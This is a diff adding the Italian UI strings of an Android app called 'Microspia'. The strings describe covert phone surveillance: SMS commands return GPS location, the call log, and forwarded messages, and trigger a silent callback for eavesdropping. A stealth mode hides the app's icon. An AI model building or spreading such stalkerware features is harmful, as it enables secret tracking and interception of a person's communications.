@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="hello">Hello World, MicrospiaActivity!</string>
+    <string name="app_name">Microspia</string>
+    <string name="btn_stealt">Abilita modalità Stealth</string>
+    <string name="homepage">&quot;Microspia attivata.\n\nUSO:\nInviare un SMS con i seguenti comandi:\nposizione: restituisce un SMS con un link a GoogleMaps per visualizzare la posizione corrente.\nchiamami: richiama automaticamente il mittente dell\'sms, per intercettazioni ambientali\nstato: restituisce un SMS con il livello di carica della batteria.\nchiamate: restituisce un SMS contenente l'elenco delle ultime 3 chiamate effettuate o ricevute\ninoltro on: avvia l\'inoltro degli sms ricevuti al mittente del comando\ninoltro off: disattiva l\'inoltro degli sms\n\nPremere il tasto Home per tornare al Launcher\n\n *** Modalita Stealth ***\nPermette di rimuovere l\'icona dell\'applicazione dal launcher, rendendola a prima vista invisibile. L\'app resta presente nell\'elenco dei programmi installati.\n&quot;</string>
+    <string name="gps_dialog_title">GPS Disattivato</string>
+    <string name="impostazioni_button">Impostazioni</string>
+    <string name="gps_dialog_text">"E' necessario attivare il GPS per utilizzare la funzionalità di tracciamento."</string>
+    <string name="application_hidden">Applicazione nascosta</string>
+    <string name="restart_needed">&quot;L'icona dell'applicazione è stata nascosta. E' necessario riavviare il telefono per completare l'operazione.&quot;</string>
+    <string name="back_home">&quot;Torna alla Home&quot;</string>
+    <string name="stealth_confirm">&quot;Abilitando la modalità stealth l'icona dell'applicazione non sarà più visibile: per ripristinarla sarà necessario disinstallare e reinstallare l'app.\nVuoi continuare?&quot;</string>
+    <string name="hiding_toast">&quot;Nascondo icona...&quot;</string>
+</resources>
